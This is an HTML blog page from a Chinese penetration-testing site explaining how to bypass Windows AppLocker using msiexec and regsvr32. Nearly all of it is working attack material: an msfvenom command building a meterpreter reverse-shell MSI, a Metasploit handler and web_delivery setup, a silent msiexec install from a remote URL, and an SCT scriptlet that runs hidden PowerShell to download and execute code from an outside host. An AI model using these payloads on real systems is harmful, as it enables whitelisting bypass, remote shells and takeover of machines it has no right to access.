@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>Bypass Applocker with msiexec</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/msiexec.html" rel="bookmark"
+           title="Permalink to Bypass Applocker with msiexec">Bypass Applocker with msiexec</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-05-22T00:00:00+02:00">
+                <a href='#'>05/22/2017 </a>
+                <a href="/category/learning.html">Learning</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p><a href="https://evi1cg.me/archives/Bypassing_Applocker_with_msiexec.html">https://evi1cg.me/archives/Bypassing_Applocker_with_msiexec.html</a></p>
+<ul>
+<li>使用msf生成反弹的后门：</li>
+</ul>
+<p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=x.x.x.x lport=xxx -f msi &gt; rever.msi</code></p>
+<ul>
+<li>服务器监听</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="k">handler</span>
+<span class="k">set</span> <span class="n">lhost</span> <span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span>
+<span class="k">set</span> <span class="n">lport</span> <span class="n">xx</span>
+<span class="k">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+<span class="n">exploit</span>
+</pre></div>
+
+
+<ul>
+<li>在服务器上面加载：</li>
+</ul>
+<p><code>msiexec /q /i http://xxx.com/rever.msi</code> </p>
+<h2>regsrv32</h2>
+<p><a href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-regsvr32-exe/">https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-regsvr32-exe/</a></p>
+<div class="highlight"><pre><span></span><span class="n">regsvr32</span> <span class="o">/</span><span class="n">s</span> <span class="o">/</span><span class="n">n</span> <span class="o">/</span><span class="n">u</span> <span class="o">/</span><span class="n">i</span><span class="p">:</span><span class="mi">1</span><span class="p">.</span><span class="n">sct</span> <span class="n">scrobj</span><span class="p">.</span><span class="n">dll</span>
+</pre></div>
+
+
+<p>弹计算器：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?</span><span class="nx">XML</span> <span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="cp">?&gt;</span>
+  <span class="nt">&lt;scriptlet&gt;</span>
+    <span class="nt">&lt;registration</span>     
+      <span class="na">progid=</span><span class="s">&quot;PoC&quot;</span>
+      <span class="na">classid=</span><span class="s">&quot;{F0001111-0000-0000-0000-0000FEEDACDC}&quot;</span> <span class="nt">&gt;</span>
+      <span class="c">&lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;</span>
+      <span class="c">&lt;!--  License: BSD3-Clause --&gt;</span>
+     <span class="nt">&lt;script</span> <span class="na">language=</span><span class="s">&quot;JScript&quot;</span><span class="nt">&gt;</span>
+       <span class="cp">&lt;![CDATA[ var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); ]]&gt;</span>
+     <span class="nt">&lt;/script&gt;</span>
+   <span class="nt">&lt;/registration&gt;</span>
+ <span class="nt">&lt;/scriptlet&gt;</span>
+</pre></div>
+
+
+<h3>MSF</h3>
+<div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">script</span><span class="o">/</span><span class="n">web_delivery</span>
+<span class="k">set</span> <span class="n">LHOST</span> <span class="o">&lt;</span><span class="n">ip</span> <span class="n">address</span><span class="o">&gt;</span>
+<span class="k">set</span> <span class="n">LPORT</span> <span class="o">&lt;</span><span class="n">port</span><span class="o">&gt;</span>
+<span class="k">set</span> <span class="n">target</span> <span class="mi">2</span>
+<span class="n">exploit</span> <span class="o">-</span><span class="n">j</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="cp">&lt;?</span><span class="nx">XML</span> <span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="cp">?&gt;</span>
+  <span class="nt">&lt;scriptlet&gt;</span>
+    <span class="nt">&lt;registration</span> 
+      <span class="na">progid=</span><span class="s">&quot;PoC&quot;</span>
+      <span class="na">classid=</span><span class="s">&quot;{F0001111-0000-0000-0000-0000FEEDACDC}&quot;</span> <span class="nt">&gt;</span> 
+     <span class="c">&lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;</span> 
+     <span class="c">&lt;!--  License: BSD3-Clause --&gt;</span> 
+      <span class="nt">&lt;script</span> <span class="na">language=</span><span class="s">&quot;JScript&quot;</span><span class="nt">&gt;</span> 
+        <span class="cp">&lt;![CDATA[ var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell.exe -nop -w hidden -c $y=new-object net.webclient;$y.proxy=[Net.WebRequest]::GetSystemWebProxy();$y.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $y.downloadstring(&#39;http://192.168.157.130:8080/dxVDB2e&#39;);&quot;); ]]&gt;</span>
+     <span class="nt">&lt;/script&gt;</span>
+   <span class="nt">&lt;/registration&gt;</span>
+  <span class="nt">&lt;/scriptlet&gt;</span>
+</pre></div>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
